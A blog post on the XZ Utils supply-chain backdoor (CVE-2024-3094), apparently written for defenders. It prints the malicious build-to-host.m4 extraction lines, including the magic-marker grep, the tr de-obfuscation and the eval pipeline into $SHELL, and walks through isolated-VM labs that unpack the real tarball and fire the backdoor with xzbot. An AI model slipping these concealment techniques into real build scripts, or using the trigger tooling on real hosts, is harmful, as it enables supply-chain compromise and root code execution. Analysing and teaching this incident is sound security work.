---
layout: post
title: "Anatomy of a Backdoor: The XZ Utils Supply-Chain Attack (CVE-2024-3094)"
categories: ['blog']
tags: ['cyber', 'supply-chain', 'ssh', 'linux', 'opensource']
summary: "The story of CVE-2024-3094: how an attacker spent two years earning maintainer trust in XZ Utils, hid a backdoor in its build scripts and test files that hijacked SSH authentication, and was caught by an engineer chasing a half-second slowdown. Includes how to check your exposure and two hands-on labs for inspecting and detonating the payload in an isolated VM."
tldr: >-
  CVE-2024-3094 was a backdoor in XZ Utils, planted by an attacker who spent two years earning maintainer trust and hid the payload in build scripts and test files. It hooked SSH authentication so that only the holder of the attacker's private key could run commands, and an engineer caught it by chasing a half-second slowdown. The post covers how to check exposure and includes two isolated-VM labs for inspecting and detonating the payload.
---

On Friday, March 29, 2024, a Microsoft engineer named [Andres Freund](https://github.com/anarazel) sent an email to the `oss-security` mailing list.
In my view, that email averted what could have been one of the most consequential supply-chain compromises in the history of open source.
He had been chasing a performance oddity: SSH logins on a Debian test system were running about **half a second slower** than they should have, and `liblzma` was burning suspicious amounts of CPU.
At the bottom of that rabbit hole he found a deliberately planted backdoor in **XZ Utils**, a compression library that ships in nearly every Linux distribution.

This is the story of [CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094), a CVSS **10.0 Critical**, and why I think it should change how we think about the software we trust.
This was a *patient, human-driven* attack: a roughly two-year social-engineering campaign that ended with an RCE backdoor poised to land in the SSH daemon of millions of servers.
It was caught, by luck and one stubborn engineer, just before it reached them.
It is the best teaching case I know of for the modern supply-chain threat, and I wanted to understand it well enough to build it in a lab, so the second half of this post does exactly that.

## What is XZ Utils, and why does it matter?

XZ Utils is the reference implementation of the **LZMA** compression algorithm.
Its core library, `liblzma`, is a dependency of an enormous amount of software.
The critical detail for this attack is a transitive dependency chain that most people never think about:

- On many distributions (notably Debian and Fedora derivatives), **OpenSSH's `sshd` is patched to link against `libsystemd`** for service notification (`sd_notify`).
- **`libsystemd`, in turn, links `liblzma`.**

So one of the most security-sensitive remote-access daemons in the world was pulling a compression library into its address space, and almost nobody was watching that seam.
The attacker built two years of work around it.

## The long con: social engineering a maintainer

The technical payload is clever, but in my opinion the *delivery mechanism* is the most instructive part of this attack.
For years, XZ Utils was maintained largely by a single volunteer, **Lasse Collin**.
The project fits the [xkcd "Dependency"](https://xkcd.com/2347/) problem closely: the entire modern internet resting on a project "some random person in Nebraska has been thanklessly maintaining since 2003."

Starting in 2021, a brand-new contributor calling themselves **"Jia Tan"** (GitHub handle `JiaT75`, which was still visible on GitHub at the time of writing) began submitting patches.
Over two years they built a track record of legitimate-looking contributions and slowly earned trust.
Then the pressure campaign began.
A cluster of **sockpuppet accounts**, with names like `Jigar Kumar`, `krygorin4545`, and `misoeater91`, appeared on the mailing lists to lean on the burned-out maintainer.
They complained that patches weren't being merged fast enough, that the project was stagnant, and that it needed a co-maintainer.
Collin, under real-life stress and dealing with mental-health pressures he'd been candid about, eventually granted Jia Tan commit rights and release authority.

> **The lesson, as I see it:** the attacker *manufactured* trust over two years, then exploited the human at the weakest point of the chain.
> I know of no firewall, WAF, or CVE scanner that would detect "a maintainer was socially engineered over 24 months."

## The payload: hidden in plain sight

Once Jia Tan controlled releases, the backdoor went in for versions **5.6.0** (February 2024) and **5.6.1** (March 2024).
In my view, the concealment was the most skillful part:

1. **It wasn't in the git repository.**
   The malicious logic lived in a modified `build-to-host.m4` script that was present **only in the release tarball** (the `.tar.gz` distributions packagers actually build from) and absent from the public Git source.
   Anyone auditing GitHub saw clean code.
   The lesson I take from this detail is that *what you review is not always what you build.*

2. **The binary payload was disguised as test data.**
   The actual machine code was smuggled into the repo as "corrupt" test fixtures for the compression tests, in files like `bad-3-corrupt_lzma2.xz`.
   They looked like garbage test inputs.
   During the build, the `m4` script extracted and decompressed them to assemble the real payload.

3. **It was build-environment-aware.**
   The injection only fired when building on **x86-64 Linux with glibc and GCC**, under an RPM or Debian packaging process.
   On any other system (including a developer's casual local build) it stayed dormant.
   This is a classic anti-analysis technique: behave benignly except in the exact conditions you're targeting.

### Artifact 1: the obfuscated extractor

The malicious `build-to-host.m4` first located its payload by scanning the source tree for a **magic marker**, a string of `####<5 chars>####`.
That one line is the whole trick: it lets the build pull in a file nobody would think to inspect.

```bash
# From the injected build-to-host.m4 — find the payload by its magic marker
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
```

The contents were then run through a byte-substitution `tr` command, which de-obfuscated the next stage.
On its own it does nothing, but it has become one of the most recognizable fingerprints of this attack:

```bash
# The stage-0 de-obfuscation: a custom byte map, not a real cipher
tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"
```

The command is only a character-mangling pipe, with no malware in it.
That is why I believe it slid past review: nothing in it *looks* dangerous in isolation.

### Artifact 2: the payload disguised as test data

The actual machine code never appeared as source.
It lived in the test fixtures, where "binary garbage" is *expected* and rarely audited:

```text
tests/files/bad-3-corrupt_lzma2.xz       # stage-1 shell script (extracted at build time)
tests/files/good-large_compressed.lzma   # the bulk of the backdoor payload itself
```

A quick look at the headers shows why a casual inspection raised no alarm.
These files don't even parse as valid `xz`/`lzma` streams, so any tool that touched them simply treated them as the corrupt inputs they claimed to be:

```bash
# In a SAFE, offline VM only — inspecting headers, never executing
$ xxd tests/files/bad-3-corrupt_lzma2.xz | head -n 2
# (bytes that are not a well-formed .xz magic — by design)
```

> In my view, the hardest problem for the attacker was choosing where to put the payload.
> The test fixtures are the one directory in an open-source repo where an opaque binary blob looks like it belongs, and where nobody reads the bytes.

## The mechanism: hijacking SSH authentication

When the conditions were met, the backdoor hooked itself into the running `sshd` process using **glibc IFUNC resolvers**.
IFUNC ("indirect function") is a legitimate glibc mechanism that lets a library pick the best implementation of a function *at load time* (e.g., choosing an AVX-optimized `memcpy`).
The backdoor abused this to run its own resolver code during dynamic linking and **redirect a function in OpenSSH's authentication path**, specifically `RSA_public_decrypt`.

As a result, an attacker holding a specific **Ed448 private key** could craft a certificate that, when presented during the SSH handshake, caused the hooked function to **execute an arbitrary payload before authentication ever completed**.
The attacker needed no password and no valid account, and no successful login was ever logged.
Only the key holder could trigger this pre-auth remote code execution, so even a defender who found the backdoor couldn't easily use it, and couldn't easily tell if they'd been hit.

### What it actually does, and what it doesn't {#what-it-actually-does--and-what-it-doesnt}

Many summaries gloss over this part:

- **No beacon or C2 implant.**
  It never makes an outbound connection and never phones home.
  It is passive: it sits inside `sshd` and waits for the attacker to come to it.
  (That is part of why egress monitoring would never have flagged it.)

- **No "magic login" either.**
  There is no rogue `authorized_keys` entry, no hardcoded password, and no extra account.
  There is no authenticated session and no successful-login record.

- **Gated, pre-authentication remote code execution.**
  The backdoor carries the attacker's Ed448 _public_ key baked in; only the holder of the matching _private_ key can trigger it.
  The result is `system(command)` running as root before authentication even finishes, with no shell prompt involved.

So the "prepacked key" intuition is half right.
There *is* an embedded key, but it is the attacker's *public* key, used to **authenticate the trigger**; it is not a credential anyone can log in with.
In my assessment the payoff is more dangerous than a login: arbitrary command execution as root, with no account, no password, and nothing written to the auth log.

The full trigger chain has two branches.
For anyone *without* the private key (that is, everyone else on the internet), the hook silently falls through to the real function and the server behaves normally.
Only a valid Ed448 signature unlocks code execution:

![Sequence of the xz backdoor trigger](../images/diagrams/lab3-trigger-sequence.png)

*The trigger chain: a valid Ed448 signature turns an ordinary-looking pubkey auth into pre-auth RCE; everyone else gets a normal SSH server.*

### Could you just crack the key?

An obvious question follows: if the attacker's **public** key is sitting right there in the binary, can someone recover the private key and seize the backdoor for themselves?
**No, and more compute would not change that.**

That key is **Ed448**, an elliptic-curve scheme with roughly **224 bits of security**.
Recovering the private key from the public key means solving the elliptic-curve discrete-log problem; the best known attack (Pollard's rho) is on the order of **2²²⁴ operations**.
That is the same barrier that protects Ed25519 or a 3072-bit RSA key, and a computation of that size would finish long after the sun burns out.
For that reason, no serious cracking attempt was ever mounted.
It is also **why research tools like [xzbot](https://github.com/amlweems/xzbot) patch in their _own_ key** instead of recovering the original: they work around a lock that cannot be broken.

The cryptographically *interesting* part is how the key got **into** the binary.
The build appeared to produce the public key in a way that looked impossible (the key materializing before any private key existed).
The explanation is **x86 steganography**: the key bytes were scattered across otherwise-valid machine instructions in the compiled payload, hidden inside the code instead of stored as an obvious constant.
([rya.nc's analysis](https://rya.nc/xz-valid-n.html) walks through it.)

My caveats on whether the real key could *ever* surface:

- **Cryptanalysis:** no, barring a fundamental break in Ed448 itself.
- **Quantum:** a large fault-tolerant quantum computer could solve this via Shor's algorithm, but nothing remotely capable exists (and all current ECC shares that fate).
- **Operationally:** the only realistic path is the actor leaking or reusing the key, or a law-enforcement seizure.

So to this day the backdoor can be triggered **only by whoever holds that one private key**.
That restriction is part of what made it such a clean, targeted weapon that no one else could use.

## The catch: a half-second and a curious engineer

What saved us was one engineer who refused to ignore an anomaly.
Andres Freund noticed SSH logins were ~500ms slower than expected and that `liblzma` was eating CPU.
Profiling showed strange symbol-resolution overhead, and **Valgrind** threw errors that didn't make sense for a compression library.
He pulled the thread, found the backdoor, and disclosed it before 5.6.x had propagated into the *stable* releases of the major distributions.

### Artifact 3: the disclosure, in his own words

The entire industry found out from a single mailing-list post.
The understated opening is worth reading; this is what "we got lucky" sounds like in real time:

> After observing a few odd symptoms around liblzma (part of the xz package) on
> Debian sid installations over the last weeks (logins with ssh taking a lot of
> CPU, valgrind errors) I figured out the answer:
>
> The upstream xz repository and the xz tarballs have been backdoored.
>
> Andres Freund, [oss-security, 29 March 2024](https://www.openwall.com/lists/oss-security/2024/03/29/4)

The malicious 5.6.x versions had reached rolling/testing branches (Fedora Rawhide, Debian sid/testing, openSUSE Tumbleweed, Kali, some Arch builds) but largely **missed the stable enterprise releases**, so in my view we got extraordinarily lucky.

The first warning came from a performance regression and a curious mind.
No CVE feed, vendor bulletin, or EDR alert fired before it.

## Are you affected?

Check your XZ/liblzma version:

```bash
xz --version
# Vulnerable: 5.6.0 and 5.6.1
```

```bash
# Confirm whether your sshd even pulls in liblzma (via libsystemd) — this shows the
# linkage that made the attack possible; it does NOT by itself prove compromise.
# For an authoritative malicious-build check, use the CISA / distro advisory script.
ldd "$(command -v sshd || echo /usr/sbin/sshd)" | grep -E 'liblzma|libsystemd'
```

If you're on a stable enterprise distro (RHEL, stock Debian/Ubuntu LTS), you were almost certainly never exposed, but **verify instead of assuming**.
Downgrade to a known-good `5.4.x` line if you find `5.6.0`/`5.6.1`, and rotate any credentials/keys on a host you can't fully clear.

## Getting hands-on: poking the bear

To get some hands-on experience, I created [a set of labs](https://github.com/stevehenderson/lab_xz_backdoor) to explore this CVE safely.

### Prereqs

The labs are designed for Ubuntu Linux 22 and later.

Install Canonical [multipass](https://canonical.com/multipass), an excellent virtual machine manager for Ubuntu.

```
sudo snap install multipass
```

Download the labs:

```
git clone https://github.com/stevehenderson/lab_xz_backdoor.git
cd lab_xz_backdoor
```

### Lab 1 - Inspecting the malware files


```
./lab1-inspect/run.sh --keep
```

This runs a script that downloads the official compromised xz tarball (the same one Andres Freund caught) to a temporary directory.
The script then uploads that file to an isolated VM, where it unpacks and analyzes the compromised xz package and generates a report.
We add `--keep` here to keep the VM so we can go through things manually.

The lab should finish on its own:

```
.
.
.
------------------------------------------------------------
### Done
------------------------------------------------------------
Full log saved to: /home/ubuntu/lab1/out/inspection.log
Nothing was built or executed. Tear the guest down with 'make clean'.
[+] Inspection complete. Report: /home/henderso/dev/labs/lab_xz_backdoor/reports/lab1-5.6.1-20260614T173210Z/inspection.log
[*] Keeping VM 'xz-lab' (--keep). Remove later with 'make clean'.
[+] Lab 1 done. Read the log above; nothing was built or executed.
```


Now we can go through it manually.

#### Connect to the Isolated Lab 1 VM

```
multipass list
```

You should see `xz-lab` running:

```
xz-lab                  Running           10.63.59.63      Ubuntu 22.04 LTS
```

Connect over the console:

```
multipass shell xz-lab
```

You are now logged into the VM.
You should be able to see the compromised xz 5.6.1 tarball:


#### Inspecting the Compromised xz tarball

```
ubuntu@xz-lab:~$ ls lab1/
clean-build-to-host.m4  inspect.sh  out  xz-5.6.1.tar.gz
ubuntu@xz-lab:~$ 
```

Check its SHA-256 hash:

```
ubuntu@xz-lab:~$ sha256sum lab1/xz-5.6.1.tar.gz 
2398f4a8e53345325f44bdd9f0cc7401bd9025d736c6d43b372f4dea77bf75b8  lab1/xz-5.6.1.tar.gz
```

Looking up this hash on [VirusTotal](https://www.virustotal.com/gui/home/search) confirms it is malicious:


![Virus Total Search](../images/xz/image.png)

![Virus Total Results](../images/xz/image-1.png)


Note this file in the VirusTotal report: `xz-5.6.1/m4/build-to-host.m4`

Next, find this file in the tarball inside the VM:


```
ubuntu@xz-lab:~$ mkdir /tmp/foo
ubuntu@xz-lab:~$ tar xvfz lab1/xz-5.6.1.tar.gz -C /tmp/foo
```


If we look in the m4 directory, we will see the compromised file with the backdoor: `/tmp/foo/xz-5.6.1/m4/build-to-host.m4`

This file is **only in the tarball**; it is not in xz's git source tree.
It is part of [gnulib](https://github.com/coreutils/gnulib) and only appears in the generated tarball as part of the build process.
***That is exactly where the backdoor hid.***

We can verify this with a diff of a clean gnulib copy (which our lab script should have pulled) against the compromised gnulib copy in the xz tarball:


```
cd ~/lab1
diff clean-build-to-host.m4 /tmp/foo/xz-5.6.1/m4/build-to-host.m4
```


![Diff of the payload file](../images/xz/image-2.png)

These lines are the hook that installs the backdoor:

```
!! 40:  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
!! 62:  if test "x$gl_am_configmake" != "x"; then
!! 63:    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
!! 67:  _LT_TAGDECL([], [gl_path_map], [2])dnl
!! 69:  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
!! 78:  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
!! 86:  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
!! 87:  if test -n "$gl_am_configmake"; then
!! 95:  gl_path_map='tr "\t \-_" " \t_\-"'
```

When `./configure` is called, this line fires:


```
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/`
```

It recursively greps the source tree for a file whose contents end with the magic marker `#### + 5 alphanumerics + ####`.
Those 5 characters are `Hello`, so it's hunting for the line `####Hello####`.
The `-a` flag forces `grep` to treat binary files as text, because the payload was buried in files that looked like xz's "corrupt" compression test fixtures (e.g. `bad-3-corrupt_lzma2.xz`).
This was clever obfuscation, although a normal build macro has no reason to scan source files for magic byte patterns.

#### Examining the backdoor code

We can look for the magic marker ourselves:

![xxd for the marker](../images/xz/image-3.png)

Teaching point: a genuine `.xz` starts with magic `FD 37 7A 58 5A 00` ('7zXZ').
These "corrupt" fixtures carry the compressed backdoor stages instead of test data, which is itself a tell.

The backdoor is injected into the binary by these commands in `/tmp/foo/xz-5.6.1/m4/build-to-host.m4`:

* Line 95: the deobfuscation cipher

```
gl_path_map='tr "\t \-_" " \t_\-"'
```

This defines a `tr` command that swaps tab↔space and -↔_.
The payload was stored with these characters transposed so it wouldn't look like valid code/data; this command reverses the substitution.

* Line 40: pick the decompressor

```
gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
```

This strips everything before the last dot to grab the file extension, which ends up being `xz`, so `$gl_[$1]_prefix` becomes the literal `xz` command used below.

* Line 63: the extraction pipeline

```
gl_[$1]_config='sed "r\n" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
```

This is the assembled command: read the hidden file → run it through the `tr` cipher → `xz -d` to decompress → discard errors.
The output is the next-stage script.
Piping a decoded and decompressed blob like this is the giveaway.

* Lines 62 / 87: guards

These are standard `"x$..." != "x" / test -n` non-empty checks, so the macro only proceeds if a payload was actually found.


* Lines 67 / 69: smuggle the variables

```
_LT_TAGDECL([], [gl_path_map], [2])
_LT_TAGDECL([], [gl_am_configmake], [2])
```

These abuse libtool's tag-declaration machinery to carry `gl_path_map` and `gl_am_configmake` through the generated configure script without looking out of place.


* Line 78: execution

```
AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
```

`AC_CONFIG_COMMANDS` registers code to run during configure.
It evaluates the pipeline from line 63 and pipes its output directly into `$SHELL`.
That is the actual code execution: the decoded payload runs.

We could try to run this ourselves at this point, but it does little beyond producing a compromised binary with an embedded backdoor.
That binary is what we want to detonate, and we'll get there in Lab 2.

Now log out of Lab 1 and shut things down.

Type the following until you are back at the developer console on your laptop or workstation:

```
exit
```

Tear down the lab:

```
make clean
```

### Lab 2 - Detonate the Backdoor

Reading the artifacts is useful, but I wanted to watch the backdoor actually *fire* and see what it looked like on the wire.
One constraint makes this more interesting than a typical exploit demo:

> **We cannot replay the real attack.**
> The trigger payload must be signed with the attacker's **Ed448 private key**, which was never published.
> Nobody except the operator can remotely activate the original backdoor.
> To study activation in a lab, we have to substitute a key *we* control.

The reference tool for this is **[amlweems/xzbot](https://github.com/amlweems/xzbot)**.
It ships an Ed448 patch (drop in your own public key so you can forge a valid trigger), an exploit demo that runs a command on the backdoored host, and a honeypot with a patched `sshd` that logs activation attempts.
All of the work below stays in the **same isolated, snapshot-able VM** setup from the previous section, reconfigured onto an internal-only network (so I can sniff the loopback/bridge traffic) with no route to the internet.

This is built into the Lab 2 setup file, so run that:

#### Prepping the Architecture

```
make lab2
```

![Making lab2](../images/xz/image-4.png)

This runs the lab autonomously, which is a good starting point for our analysis:

```
.
.
.
[+] Backdoored liblzma is loaded into sshd (pid 2383). Host is armed.
>> Taking VMs offline (drop default route; keep mgmt + isolated bridge)
>> Isolation guard on compromised (must have no internet)
[*] Isolation guard: asserting guest has NO route to the internet...
[+] Isolation guard passed: guest is offline.

=== Lab 2 ready ===
  Network: xzbr0 (10.77.0.0/24, isolated)
    analyst     10.77.0.10   (your jumpbox — control plane)
    compromised 10.77.0.20   (backdoored sshd; liblzma keyed to analyst)
    normal      10.77.0.30   (plain sshd, control)

  Drive the demo from the analyst:
    multipass shell analyst
      ~/demo/demo-latency.sh        # SSH timing: normal vs compromised
      ~/demo/demo-capture.sh        # pcap the handshakes + the trigger
      ~/demo/demo-trigger.sh        # fire the backdoor (root RCE on compromised)

  Tear it all down:  make clean   (or bash lab2-detonate/teardown.sh)
>> Ready. Drive the demo from: multipass shell analyst  (see ~/demo/)
```

The lab creates three VMs:

  * analyst: the jumpbox and control plane
  * compromised: a Linux VM with `sshd` built against the compromised `xz` library (after `setup.sh` runs)
  * normal: a plain, uncompromised VM

![Lab2 Architecture](../images/xz/image-5.png)

The Lab 2 Makefile also installs the backdoor on the compromised machine:

![Compromised Host setup during make](../images/xz/image-7.png)


#### Analysis

Open a shell on the analyst VM:

```
multipass shell analyst
```

Next, run an SSH timing test against the compromised host (the IP address appears in the `multipass list` output):

```
for i in $(seq 1 20); do   start=$(date +%s.%N);   ssh -o PreferredAuthentications=none -o StrictHostKeyChecking=no       -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 user@10.77.0.20 2>/dev/null;   end=$(date +%s.%N);   echo "$end - $start" | bc; done
```

This shows the following SSH connection times for the **compromised** host:

```
ubuntu@analyst:~$ for i in $(seq 1 20); do   start=$(date +%s.%N);   ssh -o PreferredAuthentications=none -o StrictHostKeyChecking=no       -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 user@10.77.0.20 2>/dev/null;   end=$(date +%s.%N);   echo "$end - $start" | bc; done
.181421156
.182843902
.183128082
.182681376
.182867496
.181171266
.183060066
.182089386
.182991581
.182543126
.182723134
.183225566
.186945601
.182638301
.181828258
.180882024
.184421814
.186040729
.182240909
.183035004
```

If we repeat this for the **normal** VM (without the backdoor):

```
ubuntu@analyst:~$ for i in $(seq 1 20); do   start=$(date +%s.%N);   ssh -o PreferredAuthentications=none -o StrictHostKeyChecking=no       -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 user@10.77.0.30 2>/dev/null;   end=$(date +%s.%N);   echo "$end - $start" | bc; done
.068866651
.070507232
.065902107
.067076521
.069929384
.070921903
.065793090
.067075920
.065949202
.065902640
.066759632
.066617115
.070120070
.065938200
.066978426
.066827569
.066912899
.065962894
.066258463
.067813848
```

Connections to the compromised host take roughly 3x as long as connections to the normal one.

> **A note on the numbers:** Freund's original report described SSH logins running about **500ms** slower in the wild.
> This minimal lab shows a smaller absolute delta: **~115ms** at the session level here (0.182s vs 0.067s), and a **~120ms banner stall** isolated in Frame 6 of the pcap below (a ~32x gap on *that single frame*, versus ~3x across the whole connection).
> In my view these numbers don't conflict: they reflect the **same load-time mechanism** measured three different ways, at different scales, on different hardware and build conditions.
> The number from the wild is bigger, and the lab number is cleaner.
> The exact milliseconds matter less than the fact that the cost is real, repeatable, and lands at *connection setup*.

### The PCAP reality

A packet capture supports some additional analysis.

Open a second terminal and connect to the analyst VM:

![Second Terminal](../images/xz/image-8.png)

In one terminal, start a capture on the `ens4` interface:

```
sudo tcpdump -i ens4 -n -G 60 -W 1 -w capture-compromised.pcap
```

In the other, SSH into the compromised machine:

```
ssh 10.77.0.20
```

![Capturing Compromised Traffic](../images/xz/image-9.png)

After 60 seconds the capture should stop:

![alt text](../images/xz/image-10.png)

Repeat the process, this time against the normal VM:


```
sudo tcpdump -i ens4 -n -G 60 -W 1 -w capture-normal.pcap
```

In the other terminal, SSH into the normal machine:

```
ssh 10.77.0.30
```

At this point we have a pcap of both a compromised SSH connection and a non-compromised one.

Exit the lab and the VMs:

```
exit
```

Transfer the pcaps off the box:

```
multipass transfer analyst:capture-compromised.pcap .
multipass transfer analyst:capture-normal.pcap .
```

The trigger rides inside the **SSH certificate's CA signing-key `N` value**, ChaCha20-encrypted and Ed448-signed.
SSH `userauth` happens *after* key exchange, so the trigger travels **inside the encrypted transport**.
A raw capture of a live connection shows an ordinary SSH session: TCP metadata, kex, then opaque ciphertext.

**The payload is not visible on the wire in cleartext.**
That is by design, and it should concern anyone who assumed a network IDS would have caught this.
What the pcap *does* give you:

- **Flow + timing metadata:** the abnormal CPU/latency that actually blew the whistle, visible at the session level.
- **Session structure:** concrete evidence of *why* a signature-based NIDS was blind here.

The backdoor's cost shows up as server-side processing latency between two packets; the packets themselves are not slow on the wire.
The question is *where* in the connection it lands, and this is where my capture disagreed with the tidy explanation I'd read elsewhere.

The popular framing is that the delay sits in the authentication round-trip, because the hook lives in `RSA_public_decrypt`, the function sshd calls to verify the client's offered key during user auth.
That code path does run the hook, and it does add work.
But my capture showed the bulk of the time going elsewhere.

In my capture, the dominant cost is at **session startup**.
With re-exec enabled (the default), every incoming connection forks a fresh `sshd` child that re-loads `liblzma`, and the backdoor does its expensive work *then*: it hijacks glibc's symbol resolution to plant the IFUNC hook before the daemon ever speaks.
That work happens at load time, before the banner, on every connection.
It also lines up exactly with what tipped Freund off in the first place: "strange symbol-resolution overhead."
So the latency surfaces early, in the banner/hello, before the auth exchange begins.

Two phases make a clean control for comparison:

- The TCP handshake (SYN/SYN-ACK/ACK): the kernel handles it, and sshd never runs.
- The KEXINIT negotiation and ECDH key exchange: the host-key signing in `KEX_ECDH_REPLY` uses a different function than the hooked one, so that phase times the same on compromised and clean hosts.

So in this lab the signal is right up front, at connection setup, which is what Frame 6 below makes visible.

We can view this in Wireshark.


Open Wireshark and enable:

  * Preferences → Protocols → TCP → "Calculate conversation timestamps"

![alt text](../images/xz/image-11.png)

Then add the `tcp.time_delta` column:

![alt text](../images/xz/image-15.png)

Set:

  * Title:  tcp.time_delta
  * Type:  Delta time
  * Drag the column above Info (so it appears between Length and Info)

This adds a delta-time column to each packet:

![alt text](../images/xz/image-14.png)

Leave that Wireshark instance open, and open a second one with the pcap from the normal SSH connection.
Repeat the steps above to add the delta column.

Add `ssh` as the filter in both captures:

![Comparing the ssh connections](../images/xz/image-16.png)

**Frame 6 is the clearest divergence in the capture**, though I wouldn't call it conclusive.
In the compromised session the server takes **0.1234 s** to emit its OpenSSH banner (`SSH-2.0-OpenSSH_8.9p1`); the clean host does it in **0.0038 s**.
That ~120 ms stall lands at session startup, before key exchange or auth.
That is where the re-exec/load-time argument above would predict the backdoor's hooking work to surface, and it is consistent with the per-connection CPU and latency Freund originally reported.

Two caveats keep this at the level of a lead:

- **The more widely repeated framing puts the cost in the auth round-trip** instead of the banner, because the functional hook lives in `RSA_public_decrypt`, which sshd calls during publickey `userauth` (and the `mm_answer_keyallowed` / `mm_answer_keyverify` monitor functions downstream of it).
  That path does run the hook and adds work.
  The disagreement is only about whether the *load-time* resolver cost or the *auth-time* hook cost dominates the wall clock, and a single capture can't settle that.
  It shows where the time went *here*, on *this* build; it is not a universal signature.

- **As far as I have found, published analysis never packet-localized the delay.**
  Freund found it via CPU profiling and Valgrind rather than by timing the handshake.
  So "the delay is in the banner" is my reading of this pcap; the community has not confirmed it on the wire.
  I treat the banner placement as reproducible if tested, and not yet settled.

More work is needed to verify exactly where the stall occurs.
That will require more network variety, different setups, and more repetitions.


## Was the backdoor ever used against a real target? (and why there is no capture to study)

The natural next thought is that the attacker surely *tested* this thing, so somewhere there must be a capture of a real trigger to study.
Unfortunately (or reassuringly), there is not, for several reasons:

- **No known in-the-wild use.**
  There is **no publicly documented case** of the backdoor being triggered against a real victim with the original private key.
  It was caught while still confined to *rolling/testing* distros (Debian sid, Fedora Rawhide, and others), before it reached the stable enterprise releases that were presumably the real target.
  The operator was visibly *rushing* distros to ship the update, which strongly suggests they hadn't yet reached their target population.
  In my reading, they were caught at the starting line.
- **Any testing happened off-camera.**
  An operator exercises a weapon like this privately, on infrastructure they control.
  Nobody was sniffing the attacker's lab.
- **Even a capture would reveal little.**
  As the PCAP section above explains, the trigger lives inside the SSH certificate exchanged during *publickey auth*, **after** key exchange and inside the encrypted transport.
  A passive observer sees an ordinary SSH session: handshake, kex, then opaque ciphertext.
  There are **no plaintext magic bytes on the wire**.
  The trigger is only legible *host-side*, where the hook sees the decrypted certificate.

The closest thing to "real" capture infrastructure is the honeypots researchers stood up *after* disclosure: **[lockness-Ko/xz-vulnerable-honeypot](https://github.com/lockness-Ko/xz-vulnerable-honeypot)** (genuine vulnerable xz 5.6.1 + Fedora `sshd`, watched with `bpftrace`, `strace`, `tcpdump`, and `sshd` logs) and **[xzbot](https://github.com/amlweems/xzbot)**'s logging `sshd`.
Note the asymmetry, though: a honeypot can log a connection *shaped* like the backdoor trigger, yet it can **never** observe a *valid* activation, because that needs the unknown private key.
Post-disclosure hits come from scanners and researchers probing the format; the author has not returned to the scene.

So the only valid trigger traffic that exists anywhere is the kind **you generate yourself** in the lab above.
Because the pcap is encrypted, the most useful artifact is the **host-side trace**: `bpftrace`/`strace` catching the hook fire, alongside the `xzbot: magic 1` log line.
That is the stack the honeypots instrument, and it shows what the wire never can.

## The real takeaways for defenders

XZ is already patched, so the lessons I think are worth keeping concern posture against the **next** attack of this kind:

- **Know your transitive dependencies.**
  The kill chain ran through a seam (`sshd → libsystemd → liblzma`) that almost no threat model included.
  Maintain a real **SBOM (Software Bill of Materials)** so you can answer "what links into my crown-jewel processes?" within minutes.
- **Build from source you actually reviewed.**
  The payload existed in the *tarball* and was absent from *git*.
  Reproducible builds and source-to-binary provenance (e.g., SLSA) close this exact gap.
- **The maintainer is part of the attack surface.**
  In my view, single-maintainer critical dependencies are a structural risk.
  Sustainable funding and co-maintainer vetting now belong among an organization's *security* controls.
- **Anomalies are signal.**
  A 500ms latency regression caught this.
  Baseline your systems' behavior (CPU, latency, and syscalls on sensitive daemons) so an anomaly stands out against a known normal.
- **Reduce *reachability*.**
  This is *pre-authentication* RCE: the payload fires while `sshd` parses the offered key, before any login decision.
  So MFA, key-only auth, and `fail2ban` do **nothing** against the trigger itself.
  What raises the cost is limiting who can open a socket to the daemon at all: network segmentation, bastion hosts, allow-listed management networks, and not exposing `sshd` to the internet.
  Least privilege then caps the blast radius if it does fire.

In my view, the XZ backdoor was stopped by a maintained system, a measured baseline, and an engineer in the loop who trusted his instincts.
I keep that in mind whenever someone describes security as purely a tooling problem.

## References

- [CVE-2024-3094 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2024-3094)
- [XZ Utils backdoor (Wikipedia)](https://en.wikipedia.org/wiki/XZ_Utils_backdoor) (detailed timeline and citations)
- [Andres Freund's original oss-security disclosure](https://www.openwall.com/lists/oss-security/2024/03/29/4)
- [CISA Alert on the XZ Utils backdoor](https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094)
- [Sonatype: a targeted backdoor supply-chain attack](https://www.sonatype.com/blog/cve-2024-3094-the-targeted-backdoor-supply-chain-attack-against-xz-and-liblzma)
- [xkcd 2347: "Dependency"](https://xkcd.com/2347/)
